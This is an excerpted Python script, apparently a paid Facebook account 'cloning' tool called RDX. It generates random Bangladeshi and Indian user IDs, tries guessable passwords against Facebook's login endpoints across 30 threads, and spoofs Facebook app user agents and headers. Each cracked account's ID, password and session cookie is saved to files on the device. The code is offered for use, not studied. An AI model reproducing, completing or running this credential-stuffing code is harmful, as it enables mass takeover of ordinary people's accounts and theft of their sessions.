...
def RDX():
	...
	bro = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/"+samsung+";FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h"
	return RDX
...
───────────────────────────────────────────
{A}────────────────────────────────────────
{G1}[{A}={G1}]{G1}  ᴛᴏᴏʟꜱ ᴏᴡɴᴇʀ{A}:{G1}   ʀᴅx-ʀᴀʙʙɪ
{G1}[{A}={G3}]{G3}  ᴛᴏᴏʟᴛʏᴘᴇ {A}  :{G3}   ꜰɪʟᴇ {A}&{G4} ʀᴀɴᴅᴏᴍ ᴄʟᴏɴɪɴɢ
{G1}[{A}={G4}]{G4}  ᴠᴇʀꜱɪᴏɴ  {A}  :{G4}   0.9
{G1}[{A}={G5}]{G5}  ᴛᴏᴏʟꜱ      {A}:{G5}   ᴾᴬᴵᴰ 
──────────────────────────────────────────
{A}──────────────────────────────────────────"""
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(f'{G1}[{A}={G2}]{G2} ᵀᴼᵀᴬᴸ ᴼᴷ {A}:{G2} %s' % str(len(oks)))
        print(f'{G1}[{A}={G2}]{G3} ᴛᴏᴛᴀʟ ᴄᴘ {A}:{G3} %s' % str(len(cps)))
        print(f'\r{A}──────────────────────────────────────────────────')
...
def menu():   
    clear()
    print(f'{G1}[{A}1{G1}]{G1} ꜰɪʟᴇ ᴄʟᴏɴɪɴɢ')
    print(f'{G1}[{A}2{G2}]{G2} ʀᴀɴᴅᴏᴍ ᴄʟᴏɴɪɴɢ')
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} ᴄʜᴏɪᴄᴇ {A}:{G5} ')
    if select =='1':
        _file_()
    elif select =='2':
        _randm_()
...
def _randm_():   
    clear()
    print(f'{G1}[{A}1{G1}]{G1} 𝙱𝙳 𝙲𝙻𝙾𝙽𝙸𝙽𝙶')
    print(f'{G1}[{A}2{G2}]{G2} 𝙸𝙽𝙳 𝙲𝙻𝙾𝙽𝙸𝙽𝙶')
...
def _bd_():
    ...
    with Habib(max_workers=30) as sexy:
        ...
        for love in user:
            ...
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','123456']
...
def _India_():
    ...
    with Habib(max_workers=30) as sexy:
        ...
        for love in user:
            ids = code+love
            psd = [love,ids[:8],'57273200','59039200','57575751','123456','kamu nanya']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop            
            sys.stdout.write(f"\r{G1}[{A}M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[OK] {sid} | {ps} ")
                    open('/sdcard/M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[CP] {sid} | {ps} ")
                     open('/sdcard/M1-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                headers = {'User-Agent': pal(),
                    ...
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': f'{str(rr(4000,6999))}',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                    print(f"\r\r{G1}[OK] {sid} | {ps} ")
                    open('/sdcard/M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[CP] {sid} | {ps} ")
                    open('/sdcard/M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}RDX-ARMY{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[RDX-OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{A} {coki}')
                open('/sdcard/OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
